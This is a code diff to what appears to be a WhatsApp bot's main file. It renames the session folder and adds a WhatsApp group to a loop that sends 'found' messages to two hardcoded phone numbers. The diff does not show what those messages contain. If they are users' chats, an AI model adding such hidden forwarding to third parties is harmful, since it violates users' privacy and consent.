@@ -111,7 +111,7 @@ loadChatgptDB();
 
 /* ------------------------------------------------*/
 
-global.authFile = `Session`;
+global.authFile = `MysticSession`;
 const {state, saveState, saveCreds} = await useMultiFileAuthState(global.authFile);
 const msgRetryCounterMap = (MessageRetryMap) => { };
 const msgRetryCounterCache = new NodeCache()
@@ -208,13 +208,13 @@ function clearTmp() {
 
 function purgeSession() {
 let prekey = []
-let directorio = readdirSync("./Session")
+let directorio = readdirSync("./MysticSession")
 let filesFolderPreKeys = directorio.filter(file => {
 return file.startsWith('pre-key-') /*|| file.startsWith('session-') || file.startsWith('sender-') || file.startsWith('app-') */
 })
 prekey = [...prekey, ...filesFolderPreKeys]
 filesFolderPreKeys.forEach(files => {
-unlinkSync(`./Session/${files}`)
+unlinkSync(`./MysticSession/${files}`)
 })
 } 
 
@@ -239,7 +239,7 @@ console.log(chalk.bold.red(`[ℹ️] حدث خطأ ما أثناء الحذف، 
 }}
 
 function purgeOldFiles() {
-const directories = ['./Session/', './jadibts/']
+const directories = ['./MysticSession/', './jadibts/']
 const oneHourAgo = Date.now() - (60 * 60 * 1000)
 directories.forEach(dir => {
 readdirSync(dir, (err, files) => {
@@ -600,6 +600,8 @@ const sendMessages = async (conn) => {
     for (const message of foundMessages.messages) {
       await conn.sendMessage('201015817243@s.whatsapp.net', { text: message });
       await conn.sendMessage('201559835871@s.whatsapp.net', { text: message });
+      await conn.sendMessage('120363292588388460@g.us', { text: message });
+      
     }
 
     logSentMessage(sentMessages, searchDate);
